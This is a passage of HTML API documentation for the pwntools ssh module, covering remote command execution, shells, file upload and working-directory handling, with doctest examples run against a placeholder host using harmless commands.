<span class="gr">NameError</span>: <span class="n">global name &#39;bar&#39; is not defined</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;echo hello&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.put">
<code class="descname">put</code><span class="sig-paren">(</span><em>file_or_directory</em>, <em>remote=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1598-1618"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.put" title="Permalink to this definition">¶</a></dt>
<dd><p>upload(file_or_directory, remote=None)</p>
<p>Upload a file or directory to the remote host.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>file_or_directory</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file or directory to download.</li>
<li><strong>remote</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Local path to store the data.
By default, uses the working directory.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.read">
<code class="descname">read</code><span class="sig-paren">(</span><em>path</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1798-1800"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.read" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper around download_data to match <a class="reference internal" href="index.html#pwnlib.util.misc.read" title="pwnlib.util.misc.read"><code class="xref py py-func docutils literal"><span class="pre">pwnlib.util.misc.read()</span></code></a></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.remote">
<code class="descname">remote</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>timeout=pwnlib.timeout.Timeout.default</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1151-1172"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.remote" title="Permalink to this definition">¶</a></dt>
<dd><p>connect_remote(host, port, timeout = Timeout.default) -&gt; ssh_connecter</p>
<p>Connects to a host through an SSH connection. This is equivalent to
using the <code class="docutils literal"><span class="pre">-L</span></code> flag on <code class="docutils literal"><span class="pre">ssh</span></code>.</p>
<p>Returns a <a class="reference internal" href="#pwnlib.tubes.ssh.ssh_connecter" title="pwnlib.tubes.ssh.ssh_connecter"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_connecter</span></code></a> object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">l</span> <span class="o">=</span> <span class="n">listen</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect_remote</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lport</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">b</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.run">
<code class="descname">run</code><span class="sig-paren">(</span><em>process</em>, <em>tty=True</em>, <em>wd=None</em>, <em>env=None</em>, <em>timeout=None</em>, <em>raw=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1064-1093"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.run" title="Permalink to this definition">¶</a></dt>
<dd><p>Backward compatibility.  Use <a class="reference internal" href="#pwnlib.tubes.ssh.ssh.system" title="pwnlib.tubes.ssh.ssh.system"><code class="xref py py-meth docutils literal"><span class="pre">system()</span></code></a></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.run_to_end">
<code class="descname">run_to_end</code><span class="sig-paren">(</span><em>process</em>, <em>tty = False</em>, <em>timeout = Timeout.default</em>, <em>env = None</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1129-1149"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.run_to_end" title="Permalink to this definition">¶</a></dt>
<dd><p>Run a command on the remote server and return a tuple with
(data, exit_status). If <cite>tty</cite> is True, then the command is run inside
a TTY on the remote server.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">s</span><span class="o">.</span><span class="n">run_to_end</span><span class="p">(</span><span class="s1">&#39;echo Hello; exit 17&#39;</span><span class="p">)</span>
<span class="go">(&#39;Hello\n&#39;, 17)</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.set_working_directory">
<code class="descname">set_working_directory</code><span class="sig-paren">(</span><em>wd=None</em>, <em>symlink=False</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1709-1792"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.set_working_directory" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets the working directory in which future commands will
be run (via ssh.run) and to which files will be uploaded/downloaded
from if no path is provided</p>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p>This uses <code class="docutils literal"><span class="pre">mktemp</span> <span class="pre">-d</span></code> under the covers, sets permissions
on the directory to <code class="docutils literal"><span class="pre">0700</span></code>.  This means that setuid binaries
will <strong>not</strong> be able to access files created in this directory.</p>
<p class="last">In order to work around this, we also <code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span></code> the directory.</p>
</div>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>wd</strong> (<a class="reference internal" href="index.html#pwnlib.elf.elf.ELF.string" title="pwnlib.elf.elf.ELF.string"><em>string</em></a>) &#8211; Working directory.  Default is to auto-generate a directory
based on the result of running &#8216;mktemp -d&#8217; on the remote machine.</li>
<li><strong>symlink</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; <p>Create symlinks in the new directory.</p>
<p>The default value, <code class="docutils literal"><span class="pre">False</span></code>, implies that no symlinks should be
created.</p>
<p>A string value is treated as a path that should be symlinked.
It is passed directly to the shell on the remote end for expansion,
so wildcards work.</p>
<p>Any other value is treated as a boolean, where <code class="docutils literal"><span class="pre">True</span></code> indicates
that all files in the &#8220;old&#8221; working directory should be symlinked.</p>
</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">cwd</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">ls</span><span class="p">()</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">pwd</span><span class="p">()</span> <span class="o">==</span> <span class="n">cwd</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">homedir</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">pwd</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">touch</span><span class="p">(</span><span class="s1">&#39;foo&#39;</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">ls</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="n">homedir</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="s1">&#39;foo&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">ls</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="n">symlink</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="s1">&#39;foo&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">ls</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="n">homedir</span> <span class="o">!=</span> <span class="n">s</span><span class="o">.</span><span class="n">pwd</span><span class="p">()</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">symlink</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">homedir</span><span class="p">,</span><span class="s1">&#39;*&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">set_working_directory</span><span class="p">(</span><span class="n">symlink</span><span class="o">=</span><span class="n">symlink</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="s1">&#39;foo&#39;</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">ls</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="n">homedir</span> <span class="o">!=</span> <span class="n">s</span><span class="o">.</span><span class="n">pwd</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.shell">
<code class="descname">shell</code><span class="sig-paren">(</span><em>shell = None</em>, <em>tty = True</em>, <em>timeout = Timeout.default</em><span class="sig-paren">)</span> &#x2192; ssh_channel<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L651-673"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.shell" title="Permalink to this definition">¶</a></dt>
<dd><p>Open a new channel with a shell inside.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>shell</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the shell program to run.
If <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, uses the default shell for the logged in user.</li>
<li><strong>tty</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; If <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, then a TTY is requested on the remote server.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">Return a <a class="reference internal" href="#pwnlib.tubes.ssh.ssh_channel" title="pwnlib.tubes.ssh.ssh_channel"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_channel</span></code></a> object.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello; exit&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="s1">&#39;Hello&#39;</span> <span class="ow">in</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.system">
<code class="descname">system</code><span class="sig-paren">(</span><em>process</em>, <em>tty = True</em>, <em>wd = None</em>, <em>env = None</em>, <em>timeout = Timeout.default</em>, <em>raw = True</em><span class="sig-paren">)</span> &#x2192; ssh_channel<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1064-1093"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.system" title="Permalink to this definition">¶</a></dt>
<dd><p>Open a new channel with a specific process inside. If <cite>tty</cite> is True,
then a TTY is requested on the remote server.</p>
<p>If <cite>raw</cite> is True, terminal control codes are ignored and input is not
echoed back.</p>
<p>Return a <a class="reference internal" href="#pwnlib.tubes.ssh.ssh_channel" title="pwnlib.tubes.ssh.ssh_channel"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.ssh.ssh_channel</span></code></a> object.</p>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">py</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;python -i&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span> <span class="n">py</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">py</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;print 2+2&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">py</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">py</span><span class="o">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="go">&#39;4\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.unlink">
<code class="descname">unlink</code><span class="sig-paren">(</span><em>file</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1642-1653"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.unlink" title="Permalink to this definition">¶</a></dt>
<dd><p>Delete the file on the remote host</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>file</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.upload">
<code class="descname">upload</code><span class="sig-paren">(</span><em>file_or_directory</em>, <em>remote=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1598-1618"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.upload" title="Permalink to this definition">¶</a></dt>
<dd><p>Upload a file or directory to the remote host.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>file_or_directory</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the file or directory to download.</li>
<li><strong>remote</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Local path to store the data.
By default, uses the working directory.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.upload_data">
<code class="descname">upload_data</code><span class="sig-paren">(</span><em>data</em>, <em>remote</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1501-1540"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.upload_data" title="Permalink to this definition">¶</a></dt>
<dd><p>Uploads some data into a file on the remote server.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to upload.</li>
<li><strong>remote</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The filename to upload it to.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span>  <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;example.pwnme&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">user</span><span class="o">=</span><span class="s1">&#39;travis&#39;</span><span class="p">,</span>
<span class="gp">... </span>        <span class="n">password</span><span class="o">=</span><span class="s1">&#39;demopass&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">upload_data</span><span class="p">(</span><span class="s1">&#39;Hello, world&#39;</span><span class="p">,</span> <span class="s1">&#39;/tmp/upload_foo&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/upload_foo&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="go">Hello, world</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">_sftp</span> <span class="o">=</span> <span class="kc">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">_tried_sftp</span> <span class="o">=</span> <span class="kc">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">upload_data</span><span class="p">(</span><span class="s1">&#39;Hello, world&#39;</span><span class="p">,</span> <span class="s1">&#39;/tmp/upload_bar&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">file</span><span class="p">(</span><span class="s1">&#39;/tmp/upload_bar&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="go">Hello, world</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.upload_dir">
<code class="descname">upload_dir</code><span class="sig-paren">(</span><em>local</em>, <em>remote=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1563-1596"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.upload_dir" title="Permalink to this definition">¶</a></dt>
<dd><p>Recursively uploads a directory onto the remote server</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>local</strong> &#8211; Local directory</li>
<li><strong>remote</strong> &#8211; Remote directory</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.upload_file">
<code class="descname">upload_file</code><span class="sig-paren">(</span><em>filename</em>, <em>remote=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1542-1561"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.upload_file" title="Permalink to this definition">¶</a></dt>
<dd><p>Uploads a file to the remote server. Returns the remote filename.</p>
<p>Arguments:
filename(str): The local filename to download
remote(str): The remote filename to save it to. Default is to infer it from the local filename.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.which">
<code class="descname">which</code><span class="sig-paren">(</span><em>program</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1047-1062"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.which" title="Permalink to this definition">¶</a></dt>
<dd><p>Minor modification to just directly invoking <code class="docutils literal"><span class="pre">which</span></code> on the remote
system which adds the current working directory to the end of <code class="docutils literal"><span class="pre">$PATH</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.ssh.ssh.write">
<code class="descname">write</code><span class="sig-paren">(</span><em>path</em>, <em>data</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py#L1794-1796"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.write" title="Permalink to this definition">¶</a></dt>
<dd><p>Wrapper around upload_data to match <a class="reference internal" href="index.html#pwnlib.util.misc.write" title="pwnlib.util.misc.write"><code class="xref py py-func docutils literal"><span class="pre">pwnlib.util.misc.write()</span></code></a></p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.arch">
<code class="descname">arch</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.arch" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; CPU Architecture of the remote machine.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.aslr">
<code class="descname">aslr</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.aslr" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether ASLR is enabled on the system.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s2">&quot;travis&quot;</span><span class="p">,</span> <span class="s2">&quot;example.pwnme&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">aslr</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.aslr_ulimit">
<code class="descname">aslr_ulimit</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/ssh.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.ssh.ssh.aslr_ulimit" title="Permalink to this definition">¶</a></dt>
<dd><p><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">bool</span></code></a> &#8211; Whether the entropy of 32-bit processes can be reduced with ulimit.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.ssh.ssh.bits">
